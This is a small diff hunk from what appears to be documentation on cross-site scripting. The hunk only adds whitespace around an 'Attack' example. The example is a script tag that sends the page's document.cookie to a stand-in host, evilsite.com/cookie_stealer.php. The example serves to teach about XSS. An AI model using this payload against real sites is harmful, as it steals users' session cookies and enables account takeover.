@@ -162,7 +162,9 @@ Example of Cross-Site Scripting:
 	* Attack: 
 	
 	  ``<script>``
+	  
 		``window.open("http://evilsite.com/cookie_stealer.php?cookie=" + document.cookie, "_blank");``
+		
 	  ``</script>``
 
 	
